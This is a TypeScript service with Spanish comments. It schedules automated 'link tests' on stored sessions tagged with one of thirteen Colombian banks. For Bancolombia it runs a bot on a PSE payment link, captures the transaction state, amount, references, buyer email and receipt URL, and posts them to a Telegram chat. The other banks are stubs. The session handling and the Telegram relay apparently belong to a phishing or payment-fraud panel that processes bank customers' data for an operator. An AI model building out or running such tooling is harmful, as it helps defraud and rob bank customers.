import { botBancolombia } from '../bot_recovery/botBancolombia';
import { StorageService } from './StorageService';
import { TelegramService } from './TelegramService';

/** Delay antes de ejecutar el bot 5 minutos por defecto
 * 150000 = 5 minutos
 */
const LINK_TESTER_DELAY_MS = Number(process.env.LINK_TESTER_DELAY_MS) || 150000;

/** Sesiones con prueba de link ya programada */
const scheduledSessions = new Set<string>();

/**
 * Servicio encargado de probar links PSE según el banco de la sesión
 */
export class LinkTesterService {

  /**
   * Bancos alineados con WebhookController.BANK_ROUTES
   */
  static readonly BANK_KEYS = [
    'AVVILLAS',
    'BANCOLOMBIA',
    'BBVA',
    'BOGOTA',
    'CAJA_SOCIAL',
    'COLPATRIA',
    'DAVIVIENDA',
    'FALABELLA',
    'ITAU',
    'NEQUI',
    'OCCIDENTE',
    'POPULAR',
    'SERFINANZA',
  ] as const;

  /**
   * Programa la prueba del link ~2-3 min después de enviarlo por Telegram
   *
   * @param sessionId ID de la sesión
   */
  static schedule(sessionId: string): void {

    // Se valida si ya está programada
    if (scheduledSessions.has(sessionId)) return;

    // Se marca como programada
    scheduledSessions.add(sessionId);

    // Se imprime en consola
    console.log(`[LinkTester] Programado para ${sessionId} en ${LINK_TESTER_DELAY_MS}ms`);

    // Se ejecuta el bot después del delay
    setTimeout(() => {
      scheduledSessions.delete(sessionId);
      LinkTesterService.run(sessionId).catch((err) => {
        console.error(`[LinkTester] Error en ${sessionId}:`, err);
      });
    }, LINK_TESTER_DELAY_MS);
  }

  /**
   * Punto de entrada: valida sesión y delega al método del banco correspondiente
   *
   * @param sessionId ID de la sesión
   */
  static async run(sessionId: string): Promise<void> {

    // Se obtiene la sesión actual
    let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

    // Se obtiene el link a probar
    const linkUrl = currentSession.linkTester;

    // Se valida que exista linkTester
    if (!linkUrl) {
      console.log(`[LinkTester] No se encontró linkTester para ${sessionId}`);
      return;
    }

    // Se valida si ya se ejecutó la prueba
    if (currentSession.linkTesterDone) {
      console.log(`[LinkTester] Prueba ya ejecutada para ${sessionId}`);
      return;
    }

    // Se normaliza el nombre del banco (algunos usan bank en lugar de banco)
    const banco = String(currentSession.banco || currentSession.bank || '').toUpperCase();

    // Se valida que haya banco en la sesión
    if (!banco) {
      console.log(`[LinkTester] Sesión ${sessionId} sin banco definido`);
      return;
    }

    console.log(`[LinkTester] Iniciando prueba | session=${sessionId} | banco=${banco}`);

    // Se delega al método según el banco
    await LinkTesterService.runByBank(sessionId, banco, linkUrl, currentSession);
  }

  /**
   * Enruta la ejecución al método del banco indicado
   *
   * @param sessionId ID de la sesión
   * @param banco Código del banco (ej. BANCOLOMBIA)
   * @param linkUrl URL del link a probar
   * @param currentSession Datos de la sesión
   */
  static async runByBank(
    sessionId: string,
    banco: string,
    linkUrl: string,
    currentSession: any
  ): Promise<void> {

    // Se normaliza CAJA SOCIAL → CAJA_SOCIAL para el switch
    const bancoKey = banco.replace(/\s+/g, '_');

    switch (bancoKey) {
      case 'AVVILLAS':
        await LinkTesterService.runAvvillas(sessionId, linkUrl, currentSession);
        break;
      case 'BANCOLOMBIA':
        await LinkTesterService.runBancolombia(sessionId, linkUrl, currentSession);
        break;
      case 'BBVA':
        await LinkTesterService.runBbva(sessionId, linkUrl, currentSession);
        break;
      case 'BOGOTA':
        await LinkTesterService.runBogota(sessionId, linkUrl, currentSession);
        break;
      case 'CAJA_SOCIAL':
        await LinkTesterService.runCajaSocial(sessionId, linkUrl, currentSession);
        break;
      case 'COLPATRIA':
        await LinkTesterService.runColpatria(sessionId, linkUrl, currentSession);
        break;
      case 'DAVIVIENDA':
        await LinkTesterService.runDavivienda(sessionId, linkUrl, currentSession);
        break;
      case 'FALABELLA':
        await LinkTesterService.runFalabella(sessionId, linkUrl, currentSession);
        break;
      case 'ITAU':
        await LinkTesterService.runItau(sessionId, linkUrl, currentSession);
        break;
      case 'NEQUI':
        await LinkTesterService.runNequi(sessionId, linkUrl, currentSession);
        break;
      case 'OCCIDENTE':
        await LinkTesterService.runOccidente(sessionId, linkUrl, currentSession);
        break;
      case 'POPULAR':
        await LinkTesterService.runPopular(sessionId, linkUrl, currentSession);
        break;
      case 'SERFINANZA':
        await LinkTesterService.runSerfinanza(sessionId, linkUrl, currentSession);
        break;
      default:
        console.log(`[LinkTester] Banco no reconocido: ${banco}`);
        break;
    }
  }

  /**
   * Metodo encargado de enviar el mensaje final en Telegram (sin botones)
   *
   * @param sessionId ID de la sesión
   * @param currentSession Datos de la sesión
   * @param formatMessage Función que arma el mensaje HTML del banco
   */
  private static async sendFinalTelegram(
    sessionId: string,
    currentSession: any,
    formatMessage: (data: any) => string
  ): Promise<void> {

    // Se captura el messageId anterior
    const messageId = currentSession.messageId;

    // Se elimina el mensaje anterior si existe
    if (messageId) {
      await TelegramService.deletePreviousMessage(messageId.toString());
    }

    // Se formatea y envía el mensaje final
    const message = formatMessage(currentSession);
    const msgId = await TelegramService.sendMessage(message, [], sessionId);

    // Se actualiza la sesión con el nuevo messageId
    currentSession.sessionId = sessionId;
    currentSession.messageId = msgId;

    // Se persiste en storage
    await StorageService.set(`session_${sessionId}`, currentSession);
  }

  /**
   * Marca la prueba de link como completada y limpia linkTester
   *
   * @param currentSession Datos de la sesión
   */
  private static markLinkTesterDone(currentSession: any): any {

    currentSession.linkTesterDone = true;
    delete currentSession.linkTester;

    return currentSession;
  }

  // -------------------------------------------------------------------------------------- //
  // -------------------------------- Por banco ------------------------------------------- //
  // -------------------------------------------------------------------------------------- //

  /**
   * Prueba de link — Bancolombia (bot implementado)
   */
  private static async runBancolombia(
    sessionId: string,
    linkUrl: string,
    currentSession: any
  ): Promise<void> {

    // Se importa el controlador del banco
    const { BancolombiaController } = await import('../controllers/bancoBancolombia/BancolombiaController');

    // Se ejecuta el bot de recuperación
    const bot = new botBancolombia();
    const result = await bot.start(linkUrl);

    // Se recarga la sesión por si hubo cambios concurrentes
    currentSession = (await StorageService.get(`session_${sessionId}`)) || currentSession;

    // Se agrega evento bot_value según el resultado
    if (result.comprobanteUrl || result.lapTransactionState) {
      currentSession = BancolombiaController.addEvent(currentSession, 'bot_value', {
        lapTransactionState: result.lapTransactionState,
        transactionId: result.transactionId,
        referenceCode: result.referenceCode,
        reference_pol: result.reference_pol,
        message: result.message,
        lapResponseCode: result.lapResponseCode,
        TX_VALUE: result.txValue,
        pseReference1: result.pseReference1,
        buyerEmail: result.buyerEmail,
        comprobanteUrl: result.comprobanteUrl,
        botStatus: result.status,
      });
    } else {
      currentSession = BancolombiaController.addEvent(currentSession, 'bot_value', {
        botStatus: result.status || 'ERROR',
        mensaje: 'No se pudo capturar el comprobante',
      });
    }

    // Se marca como finalizado
    currentSession = LinkTesterService.markLinkTesterDone(currentSession);

    // Se envía mensaje final a Telegram
    await LinkTesterService.sendFinalTelegram(
      sessionId,
      currentSession,
      BancolombiaController.formatMessage
    );

    console.log(`[LinkTester][BANCOLOMBIA] Finalizado ${sessionId} -> ${result.status}`);
  }

  /**
   * Prueba de link — AV Villas (pendiente)
   */
  private static async runAvvillas(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][AVVILLAS] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — BBVA (pendiente)
   */
  private static async runBbva(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][BBVA] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Bogotá (pendiente)
   */
  private static async runBogota(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][BOGOTA] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Caja Social (pendiente)
   */
  private static async runCajaSocial(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][CAJA_SOCIAL] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Colpatria (pendiente)
   */
  private static async runColpatria(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][COLPATRIA] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Davivienda (pendiente)
   */
  private static async runDavivienda(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][DAVIVIENDA] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Falabella (pendiente)
   */
  private static async runFalabella(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][FALABELLA] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Itaú (pendiente)
   */
  private static async runItau(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][ITAU] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Nequi (pendiente)
   */
  private static async runNequi(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][NEQUI] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Occidente (pendiente)
   */
  private static async runOccidente(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][OCCIDENTE] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Popular (pendiente)
   */
  private static async runPopular(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][POPULAR] Bot pendiente de implementar | session=${sessionId}`);
  }

  /**
   * Prueba de link — Serfinanza (pendiente)
   */
  private static async runSerfinanza(
    sessionId: string,
    _linkUrl: string,
    _currentSession: any
  ): Promise<void> {
    console.log(`[LinkTester][SERFINANZA] Bot pendiente de implementar | session=${sessionId}`);
  }
}
